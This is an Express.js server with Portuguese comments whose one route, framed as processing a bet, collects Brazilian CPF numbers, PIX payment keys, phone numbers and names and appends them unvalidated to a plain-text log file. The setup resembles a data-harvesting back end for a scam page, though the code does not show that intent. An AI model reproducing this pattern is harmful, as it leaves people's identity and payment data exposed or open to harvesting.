import express from 'express';
import path from 'path';
import fs from 'fs';

const app = express();
const PORT = 3000;
const __dirname = path.resolve();

// Middleware para processar dados do formulário
app.use(express.urlencoded({ extended: true }));

// Define o diretório de arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));


// Rota para processar CPF e chave PIX
app.post('/processar_aposta', (req, res) => {
  const { cpf, chave_pix, telefone, nome } = req.body;

  if (!cpf || !chave_pix) {
    res.status(400).send('CPF e Chave PIX são obrigatórios.');
    return;
  }

  const logMessage = `CPF: ${cpf}, Chave PIX: ${chave_pix}, Número: ${telefone}, Nome: ${nome}\n`;


   fs.appendFile('database.log', logMessage, (err) => {
      if (err) {
        console.error('Erro ao salvar dados:', err);
        res.status(500).send('Erro ao salvar dados');
      } else {
        console.log('Dados salvos com sucesso!');
        // Após salvar os dados, envia o arquivo main.html como resposta
        res.sendFile(__dirname + '/main.html');
      }
    });
  });
// Middleware para tratar rotas não encontradas
app.use((req, res, next) => {
  res.status(404).send('Página não encontrada');
});

// Middleware para tratar erros de servidor
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Ocorreu um erro no servidor');
});

// Inicia o servidor
app.listen(PORT, () => {
  console.log(`Servidor Express iniciado em http://localhost:${PORT}`);
});
